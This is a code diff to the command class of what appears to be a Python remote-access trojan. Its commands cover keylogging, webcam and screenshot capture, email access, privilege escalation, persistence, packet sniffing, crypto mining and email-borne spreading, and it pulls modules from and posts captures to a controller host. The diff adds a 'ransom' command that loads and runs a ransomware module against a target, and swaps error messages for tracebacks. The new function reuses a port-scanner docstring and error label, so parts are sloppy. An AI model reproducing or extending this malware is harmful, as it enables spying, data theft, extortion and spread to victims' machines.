@@ -20,6 +20,9 @@ import threading
 import subprocess
 import collections
 import logging.handlers
+import traceback
+
+
 if sys.version_info[0] < 3:
     from urllib import urlretrieve
     from urllib2 import urlopen, urlparse
@@ -38,7 +41,8 @@ except ImportError:
     pass
 
 
-def log(info, level='debug'):
+def log(info, level='debug', line = -1):
+    # print(f"Line: ${line}", info)
     logging.basicConfig(level=logging.DEBUG, handlers=[logging.StreamHandler()])
     logger = logging.getLogger(__name__)
     getattr(logger, level)(str(info)) if hasattr(logger, level) else logger.debug(str(info))
@@ -329,7 +333,8 @@ class Payload():
         try:
             return eval(code)
         except Exception as e:
-            return "{} error: {}".format(self.eval.__name__, str(e))
+            return traceback.format_exc()
+            # return "{} error: {}".format(self.eval.__name__, str(e))
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='wget <url>')
@@ -357,6 +362,7 @@ class Payload():
                 return path
             except Exception as e:
                 log("{} error: {}".format(self.wget.__name__, str(e)))
+                return traceback.format_exc()
         else:
             return "Invalid target URL - must begin with 'http'"
 
@@ -394,6 +400,7 @@ class Payload():
 
         except Exception as e:
             log("{} error: {}".format(self.kill.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='help [cmd]')
@@ -410,11 +417,13 @@ class Payload():
                 return json.dumps({v.usage: v.__doc__.strip('\n').splitlines()[0].lower() for k,v in vars(Payload).items() if callable(v) if hasattr(v, 'command') if getattr(v, 'command')})
             except Exception as e:
                 log("{} error: {}".format(self.help.__name__, str(e)))
+                return traceback.format_exc()
         elif hasattr(Payload, name) and hasattr(getattr(Payload, name), 'command'):
             try:
                 return json.dumps({getattr(Payload, name).usage: getattr(Payload, name).__doc__})
             except Exception as e:
                 log("{} error: {}".format(self.help.__name__, str(e)))
+                return traceback.format_exc()
         else:
             return "'{}' is not a valid command and is not a valid module".format(name)
 
@@ -432,12 +441,15 @@ class Payload():
 
         """
         args = str(args).split()
+
         if len(args) == 1:
             module, target = args[0], ''
         elif len(args) == 2:
             module, target = args
         else:
+            log("usage: {}".format(self.load.usage))
             return "usage: {}".format(self.load.usage)
+
         target = globals()[target].__dict__ if bool(target in globals() and hasattr(target, '__dict__')) else globals()
         host, port = self.connection.getpeername()
         base_url_1 = 'http://{}:{}'.format(host, port + 1)
@@ -450,7 +462,8 @@ class Payload():
                     return '[+] {} remotely imported'.format(module)
                 except Exception as e:
                     log("{} error: {}".format(self.load.__name__, str(e)))
-                    return "{} error: {}".format(self.load.__name__, str(e))
+                    return traceback.format_exc()
+                    # return "{} error: {}".format(self.load.__name__, str(e))
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='stop <job>')
@@ -470,6 +483,7 @@ class Payload():
                 return "Job '{}' not found".format(target)
         except Exception as e:
             log("{} error: {}".format(self.stop.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='show <value>')
@@ -509,6 +523,7 @@ class Payload():
                 return self.show.usage
         except Exception as e:
             log("'{}' error: {}".format(_threads.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='abort')
@@ -572,7 +587,8 @@ class Payload():
 
             # first attempt using built-in python miner
             try:
-                import pycryptonight, pyrx
+                # import pycryptonight, pyrx
+                import pycryptonight, hashlib
                 self.child_procs['miner_py'] = globals()['Miner'](url=url, port=int(port), user=user)
                 self.child_procs['miner_py'].start()
                 return "Miner running in " + str(self.child_procs['miner_py']).pid
@@ -608,6 +624,7 @@ class Payload():
                         return result
                 except Exception as e:
                     log("{} error: {}".format(self.miner.__name__, str(e)))
+                    return traceback.format_exc()
 
         elif 'stop' in args:
             # kill python miner
@@ -646,7 +663,8 @@ class Payload():
                 return "Error: file not found"
         except Exception as e:
             log("{} error: {}".format(self.upload.__name__, str(e)))
-            return "Error: {}".format(str(e))
+            return traceback.format_exc()
+            # return "Error: {}".format(str(e))
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='webcam <mode> [options]')
@@ -691,6 +709,7 @@ class Payload():
             return "Webcam capture complete"
         except Exception as e:
             log("{} error: {}".format(self.webcam.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='passive')
@@ -717,6 +736,7 @@ class Payload():
             os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
         except Exception as e:
             log("{} error: {}".format(self.restart.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
@@ -760,6 +780,7 @@ class Payload():
                     return self.outlook.usage
             except Exception as e:
                 log("{} error: {}".format(self.email.__name__, str(e)))
+                return traceback.format_exc()
 
 
     @config(platforms=['win32'], command=True, usage='escalate')
@@ -774,6 +795,7 @@ class Payload():
             return globals()['escalate'].run(sys.argv[0])
         except Exception as e:
             log("{} error: {}".format(self.escalate.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
@@ -843,7 +865,30 @@ class Payload():
             return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
         except Exception as e:
             log("{} error: {}".format(self.process.__name__, str(e)))
+            return traceback.format_exc()
 
+
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='ransom <target>')
+    def ransom(self, target=None):
+        """
+        Scan a target host or network to identify
+        other target hosts and open ports.
+
+        `Required`
+        :param str target:      IPv4 address
+
+        """
+        res = "Success!"
+        try:
+            if 'ransom' not in globals():
+                load_res = self.load('ransom')
+
+            res = globals()['ransom'].run(target)
+            return res
+
+        except Exception as e:
+            log("{} error: {}".format(self.portscanner.__name__, str(e)))
+            return traceback.format_exc()
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='portscanner <target>')
     def portscanner(self, target=None):
@@ -858,14 +903,22 @@ class Payload():
         if 'portscanner' not in globals():
             self.load('portscanner')
         try:
-            if target:
-                if not ipv4(target):
-                    return "Error: invalid IP address '%s'" % target
-                return globals()['portscanner'].run(target)
-            else:
+
+            if not target:
                 return self.portscanner.usage
+
+            if not ipv4(target):
+                return "Error: invalid IP address '%s'" % target
+
+            res = globals()['portscanner'].run(target)
+            portscanner.run(target)
+            return res
+
         except Exception as e:
             log("{} error: {}".format(self.portscanner.__name__, str(e)))
+            return traceback.format_exc()
+
+        return "Error!"
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='keylogger [mode]')
@@ -883,6 +936,7 @@ class Payload():
                 return "Log size: {} bytes".format(length)
             except Exception as e:
                 log("{} error: {}".format('keylogger.status', str(e)))
+                return traceback.format_exc()
         if 'keylogger' not in globals():
             self.load('keylogger')
         if not mode:
@@ -936,9 +990,8 @@ class Payload():
             globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
             return 'Screenshot complete'
         except Exception as e:
-            result = "{} error: {}".format(self.screenshot.__name__, str(e))
-            log(result)
-            return result
+            log("{} error: {}".format(self.screenshot.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
@@ -974,6 +1027,7 @@ class Payload():
             return json.dumps(globals()['persistence'].results())
         except Exception as e:
             log("{} error: {}".format(self.persistence.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['linux','linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
@@ -1013,6 +1067,7 @@ class Payload():
                     return self.packetsniffer.usage
         except Exception as e:
             log("{} error: {}".format(self.packetsniffer.__name__, str(e)))
+            return traceback.format_exc()
 
 
     @config(platforms=['win32','darwin','linux','linux2'], command=True, usage='spread <gmail> <password> <URL email list>')
@@ -1036,6 +1091,7 @@ class Payload():
             return globals()['spreader'].run(gmail, password, attachment, recipients)
         except Exception as e:
             return '{} error: {}'.format(self.spread.__name__, str(e))
+            return traceback.format_exc()
 
 
     def send_task(self, task):
@@ -1185,3 +1241,4 @@ class Payload():
             else:
                 log("Connection timed out")
                 break
+
